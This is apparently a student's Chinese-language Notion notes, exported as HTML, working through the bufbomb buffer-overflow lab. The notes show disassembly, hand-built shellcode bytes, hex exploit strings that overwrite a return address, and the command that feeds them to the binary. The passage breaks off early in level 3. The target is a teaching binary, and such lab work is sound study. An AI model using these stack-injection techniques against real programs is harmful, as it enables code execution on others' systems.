src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F03a60738-fd9d-4e92-b1df-2b8f22ac488c%2FUntitled.png?width=273&amp;table=block&amp;id=9bbdf00c-7ef7-47ea-92ed-ff7b166bb906" style="width:273px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div></div><div id="https://www.notion.so/80541bd798df43d0a1936716e8e278b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">不管了，在fizz打断点看ebp到底在哪先</del></span></span></p></div><div id="https://www.notion.so/c12a54f00bf847abb5e4ca5bde6e4238" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">为什么一直段错误 在32位机器也是段错误</del></span></span></p></div><div id="https://www.notion.so/3a4c0303c2a84794a34ba6a2cd0322c2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">上面第五行之前多了一个00 。。。。。。。。。。。</del></span></span></p></div><div id="https://www.notion.so/3dad4d3313ba49fea59f24f15bc12df1" class="Divider"></div><div id="https://www.notion.so/3fc34b67cdb547cca8b866a0bebc8977" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">想象一下，ebp在0处，当leave时，esp被赋予0，现在esp和ebp都指向0，然后pop ebp </span></span></p></div><div id="https://www.notion.so/2f0026c915474b28a54d715dcd7f0a12" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">ebp指向old ebp esp指向4（每次pop esp自加4）</span></span></p></div><div id="https://www.notion.so/704a5fda6b1b42b589613624fd0b5199" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">然后ret时 pop eip 这时eip指向修改过的返回地址，esp指向8</span></span></p></div><div id="https://www.notion.so/1012dc118e1d409f941aff0768b9602a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">然后修改过的返回地址对应的指令在fizz中是push ebp，那么ebp的值（old ebp，已经被架空了的）放到8，然后esp指向4（每次push esp自减4）</span></span></p></div><div id="https://www.notion.so/1bfbeb2a56124a278341ff28e88816b5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">之后mov    %esp,%ebp 让ebp也指向esp的指向，即4，那么现在的ebp相较于之前的在0处的ebp，向上走了4</span></span></p></div><div id="https://www.notion.so/7feabf1bec5f4707addac32ddc17f607" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">fizz的ebp+8，其实是getbuf的ebp+12</span></span></p></div><div id="https://www.notion.so/b3067a63d293485193066fe84cc8a336" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 af 8d 04 08
</mark></strong></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">00 00 00 00 </mark></span></strong></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">28 4e 6b 20</mark></strong></span></span></p></div><h1 id="https://www.notion.so/8a76b486c2454cdc8499ec0c885dbaa6" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/8a76b486c2454cdc8499ec0c885dbaa6"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever2-Firecracker 爆竹</span></span></h1><div id="https://www.notion.so/c022d7bb38024b4ea4d0ba87cc688da5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">一种更为复杂的缓冲区攻击形式涉及到提供一个编码实际机器指令的字符串。然后利用字符串用堆栈上这些指令的起始地址覆盖返回指针。</span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown">当调用函数(在本例中为getbuf)执行其ret指令时，程序将开始执行堆栈上的指令</span></span><span class="SemanticString">，而不是返回。使用这种形式的攻击，让程序做几乎任何事情。放在堆栈上的代码称为</span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow">漏洞利用代码。</mark></span></span></p></div><div id="https://www.notion.so/0eb6097f980243d2943f456c92b0c2a1" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Ff988264b-2dba-42b6-a774-5c0180e87f19%2FUntitled.png?width=589.9999389648438&amp;table=block&amp;id=0eb6097f-9802-43d2-943f-456c92b0c2a1"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Ff988264b-2dba-42b6-a774-5c0180e87f19%2FUntitled.png?width=589.9999389648438&amp;table=block&amp;id=0eb6097f-9802-43d2-943f-456c92b0c2a1" style="width:589.9999389648438px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0577661ee5154b34b0f73f9abc14882e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">调用bang，但是在此之前将global_value设置为userid的cookie</span></span></p></div><div id="https://www.notion.so/cfa2a4c95be14e5daa09055148192d4c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">先找一下global_value在哪</span></span></p></div><pre id="https://www.notion.so/10ad61abe2664b44b3535df8f7cd98d2" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>08048d52 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bang</span><span class="token punctuation">></span></span>:
 8048d52:	55                   	push   %ebp
 8048d53:	89 e5                	mov    %esp,%ebp
 8048d55:	83 ec 18             	sub    $0x18,%esp
 8048d58:	a1 0c d1 04 08       	mov    0x804d10c,%eax
 8048d5d:	3b 05 04 d1 04 08    	cmp    0x804d104,%eax
 #看出0x804d10c就是global_val的存放地址</span></span></span></code></pre><div id="https://www.notion.so/30ed8bd8da964ba89083390257ed74fc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">要修改值的话得用指令吧，考虑</span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown">修改返回地址返回到缓冲区去执行恶意代码</span></span></span></p></div><div id="https://www.notion.so/5407f62cfacb46c3a1a9a7ceaa167ff4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">.S代码：cookie放到eax，*global_val放到exc，赋值cookie给global_val，然后调用bang</span></span></p></div><div id="https://www.notion.so/db509168b4d84965b3ceb90826624e31" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">obj一下得到汇编二进制代码</span></span></p></div><pre id="https://www.notion.so/4d778a08ba1841028c1896ba082f08f3" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>
Disassembly of section .text:

00000000 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.text</span><span class="token punctuation">></span></span>:
   0:	b8 28 4e 6b 20       	mov    $0x206b4e28,%eax
   5:	b9 0c d1 04 08       	mov    $0x804d10c,%ecx
   a:	89 01                	mov    %eax,(%ecx)
   c:	ff 15 52 8d 04 08    	call   *0x8048d52
   </span></span></span></code></pre><div id="https://www.notion.so/5073fcd0d44c4a16aaed4111226bc24c" class="ColumnList"><div id="https://www.notion.so/8d72d35b91a440fba87892feb6212078" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.625)"><div id="https://www.notion.so/b70756bd96704efaa6688e587d739422" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">修改返回地址返回到前面缓冲区执行恶意代码分析getbuf 这段地址在 (-0x28)ebp → </span></span></p></div></div><div id="https://www.notion.so/5c228c28056e417fa6ff9528d36a12a1" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.37500000000000006)"><div id="https://www.notion.so/cde120398f51421c871fcf4ff6d43431" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fd741f324-721a-4d56-8cb0-9fae11faf1f3%2FUntitled.png?width=248&amp;table=block&amp;id=cde12039-8f51-421c-871f-cf4ff6d43431"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fd741f324-721a-4d56-8cb0-9fae11faf1f3%2FUntitled.png?width=248&amp;table=block&amp;id=cde12039-8f51-421c-871f-cf4ff6d43431" style="width:248px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div></div><div id="https://www.notion.so/487a5a3c99174f118e2e37c4d442a0f2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">b8 28 4e 6b 20 b9 0c d1 04 08</del></span></span></p></div><div id="https://www.notion.so/b7fda4b345294ecda8ea451a643fbb9e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">89 01 ff 15 52 8d 04 08 00 00</del></span></span></p></div><div id="https://www.notion.so/1af71a1213f244eb81aaaf8246fd2ac9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">00 00 00 00 00 00 00 00 00 00</del></span></span></p></div><div id="https://www.notion.so/a46a303b42e843e1ba009865c1dc1ac7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">00 00 00 00 00 00 00 00 00 00</del></span></span></p></div><div id="https://www.notion.so/5ae940824ae840008ce3ba6a113695b8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike">00 00 00 00 c8 31 68 55</del></span></span></p></div><div id="https://www.notion.so/cc17df5db8ce49d0acd695500efeec4d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cat lever2.txt | ./hex2raw | ./bufbomb -u 202208060120</code></span></span></p></div><div id="https://www.notion.so/05dde5127d694086baef2f07533b8931" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">又段错误了</span></span></p></div><div id="https://www.notion.so/f8b939d7b1424b6eaf0e3156d26d3c36" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">call的问题，call时保存返回地址，但是我的call后面根本不应该是返回地址，我应该偷偷得调用bang而不是call。通过让</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">0x8048d52</code></span><span class="SemanticString">入栈和出栈，让eip指向与执行bang</span></span></p></div><pre id="https://www.notion.so/a08452722cf8441ab2d6159e57f038e6" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>00000000 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.text</span><span class="token punctuation">></span></span>:
   0:	b8 28 4e 6b 20       	mov    $0x206b4e28,%eax
   5:	b9 0c d1 04 08       	mov    $0x804d10c,%ecx
   a:	89 01                	mov    %eax,(%ecx)
   c:	68 52 8d 04 08       	push   $0x8048d52
  11:	c3                   	ret    </span></span></span></code></pre><div id="https://www.notion.so/2e59185fe9e24818aad1db7cefcca307" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">b8 28 4e 6b 20 b9 0c d1 04 08</strong></mark></span></span></p></div><div id="https://www.notion.so/2c7e55c1cf90423fa952b31d064fc7ed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">89 01 68 52 8d 04 08 c3 00 00</strong></mark></span></span></p></div><div id="https://www.notion.so/86eefb864ce24b20bcdd3185ebf13cd0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00</strong></mark></span></span></p></div><div id="https://www.notion.so/28e5e2b47b07467ba5f53df158835b27" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00</strong></mark></span></span></p></div><div id="https://www.notion.so/07b07615d371429aa5d01a4b29ae1c41" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 c8 31 68 55</strong></mark></span></span></p></div><div id="https://www.notion.so/742eacfdd55541c78bd427a2915ba5bc" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F3cb0885b-386c-4634-9a5d-74f709fe90d9%2FUntitled.png?width=1585&amp;table=block&amp;id=742eacfd-d555-41c7-8bd4-27a2915ba5bc"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F3cb0885b-386c-4634-9a5d-74f709fe90d9%2FUntitled.png?width=1585&amp;table=block&amp;id=742eacfd-d555-41c7-8bd4-27a2915ba5bc" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/bc24b1ee9bbe4f52947ef85efe221da8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">如果jmp？</strong></span></span></p></div><pre id="https://www.notion.so/6143ee5f967043b0b72ebc3ca058fc0e" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>00000000 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.text</span><span class="token punctuation">></span></span>:
   0:	b8 28 4e 6b 20       	mov    $0x206b4e28,%eax
   5:	b9 0c d1 04 08       	mov    $0x804d10c,%ecx
   a:	89 01                	mov    %eax,(%ecx)
   c:	ff 25 52 8d 04 08    	jmp    *0x8048d52</span></span></span></code></pre><div id="https://www.notion.so/4b9777809e5f4e9daf09c314213b3346" class="ColumnList"><div id="https://www.notion.so/af0aeddf35974785a344d017153d49ae" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/fa48d46d0bea426c9b54d440aeb0bd37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">b8 28 4e 6b 20 b9 0c d1 04 08</strong></del></span></span></p></div><div id="https://www.notion.so/811672e5b6334ca78b068923911881f3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">89 01 ff 25 52 8d 04 08</strong></del></span><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike"> </del></span><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00</strong></del></span></span></p></div><div id="https://www.notion.so/bef6294a1a804f9bb005a31b14989036" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00</strong></del></span></span></p></div><div id="https://www.notion.so/f59bfaa61c224007bd60bf26e5b58415" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00</strong></del></span></span></p></div><div id="https://www.notion.so/c46194829e6d4ff396162c32ea9dba0f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><del class="SemanticString__Fragment SemanticString__Fragment--Strike"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 c8 31 68 55</strong></del></span></span></p></div><div id="https://www.notion.so/3578d5d455044e3fa33d3d34bbcadba1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">又段错误了</span></span></p></div><div id="https://www.notion.so/899e09882d374361969fc69be7c7179d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">看起来ff 25 52 8d 04 08没有被正确读取</span></span></p></div><div id="https://www.notion.so/1bb0f29587524216aa37b9ca467b63cd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">哦，应该用直接跳转。。</span></span></p></div></div><div id="https://www.notion.so/5301e20c5cee43f3b54a861ef3eec293" class="Column" style="width:calc((100% - var(--column-spacing) * 1) * 0.5)"><div id="https://www.notion.so/aada85f225264a7eaa2c16903b144f46" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fd413fc88-a201-4c08-9e5c-4f99f167ce47%2FUntitled.png?width=401&amp;table=block&amp;id=aada85f2-2526-4a7e-aa2c-16903b144f46"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2Fd413fc88-a201-4c08-9e5c-4f99f167ce47%2FUntitled.png?width=401&amp;table=block&amp;id=aada85f2-2526-4a7e-aa2c-16903b144f46" style="width:401px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></div></div><pre id="https://www.notion.so/6f5c139a8b4d40ccae9f3e7a51a71e03" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>00000000 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.text</span><span class="token punctuation">></span></span>:
   0:	b8 28 4e 6b 20       	mov    $0x206b4e28,%eax
   5:	b9 0c d1 04 08       	mov    $0x804d10c,%ecx
   a:	89 01                	mov    %eax,(%ecx)
   c:	e9 4e 8d 04 08       	jmp    0x8048d5f</span></span></span></code></pre><div id="https://www.notion.so/67ca8238cb634fa5831697e45ccbceb9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">ok，解析出问题了，因为</span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown">jmp在编译时用相对的偏移量，这不合适</span></span><span class="SemanticString">，所以还是得使用间接跳转</span></span></p></div><pre id="https://www.notion.so/459013245b024aafa81f75f3bbc83be6" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>00000000 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.text</span><span class="token punctuation">></span></span>:
   0:	b8 28 4e 6b 20       	mov    $0x206b4e28,%eax
   5:	b9 0c d1 04 08       	mov    $0x804d10c,%ecx
   a:	ba 52 8d 04 08       	mov    $0x8048d52,%edx #edx保存一下bang的地址
   f:	89 01                	mov    %eax,(%ecx)
  11:	ff e2                	jmp    *%edx</span></span></span></code></pre><div id="https://www.notion.so/6b8ff18034e6479f8ca9b34e1f4ffcde" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">b8 28 4e 6b 20 b9 0c d1 04 08</strong></mark></span></span></p></div><div id="https://www.notion.so/02bacd7cfa75462eab86468624a89c2f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ba 52 8d 04 08 89 01 ff e2 00</strong></mark></span></span></p></div><div id="https://www.notion.so/e0da4aba6b604cdcb183243e63b38dab" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00</strong></mark></span></span></p></div><div id="https://www.notion.so/19a0133176d04d1bbb9b23f2b9ff084c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 00 00 00 00 00 00</strong></mark></span></span></p></div><div id="https://www.notion.so/467e6d28f8bd4576b6e4f6ef855e2ee3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorYellow"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">00 00 00 00 c8 31 68 55</strong></mark></span></span></p></div><div id="https://www.notion.so/a5a02e04b7d949749ffe4aa8c89b6243" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F34cb11bb-0a09-488a-94f4-e33ee39ac74a%2FUntitled.png?width=708&amp;table=block&amp;id=a5a02e04-b7d9-4974-9ffe-4aa8c89b6243"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fdd719a06-a4c3-47e4-9b49-3a2adc703adc%2F34cb11bb-0a09-488a-94f4-e33ee39ac74a%2FUntitled.png?width=708&amp;table=block&amp;id=a5a02e04-b7d9-4974-9ffe-4aa8c89b6243" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><h1 id="https://www.notion.so/563bd26788134040b2a0df0b1a3d3c7f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/563bd26788134040b2a0df0b1a3d3c7f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">lever3-Dynamite 炸药</span></span></h1><div id="https://www.notion.so/a7e3dc5cf4cc441da8c506eeb4d6d95b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">更加隐蔽——让getbuf返回我的cookie，而不是返回正常执行的0x1，同时需要返回test，</span></span></p></div><div id="https://www.notion.so/4648374654e64993ac20806f12a4eaf9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">（将机器码放入堆栈，设置返回指针为代码开头，撤销一切对堆栈的破坏）</span></span></p></div><div id="https://www.notion.so/b2092487c9fe437c98c6fa13f3b71b1c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">思路：</strong></span></span></p></div><div id="https://www.notion.so/c3afc5e9869f485a91530fd1da227631" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">观察getbuf发现eax储存返回值，需要修改eax的值为cookie</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">0x206b4e28</code></span><span class="SemanticString"> 同时正常返回test</span></span></p></div><div id="https://www.notion.so/0d6b47108afb40c6b0ef7ae042bc1f47" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">要修改eax，利用类似lever2的办法，将</span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown">返回地址修改为ebp-0x28</span></span></span></p></div><div id="https://www.notion.so/2c9d6f858b974466bcc76a42b7f7d9ad" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">执行修改eax的代码与</span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown">设置返回地址为test</span></span><span class="SemanticString">的相关代码，使用push/ret或者jmp *,前者可能更好，少用一个寄存器，</span></span></p></div><pre id="https://www.notion.so/73ce23562681493ea1c301c22cce80e8" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>08048e3c <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span>:
……
 8048e4b:	e8 12 04 00 00       	call   8049262 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>getbuf</span><span class="token punctuation">></span></span>
 8048e50:	89 c3                	mov    %eax,%ebx
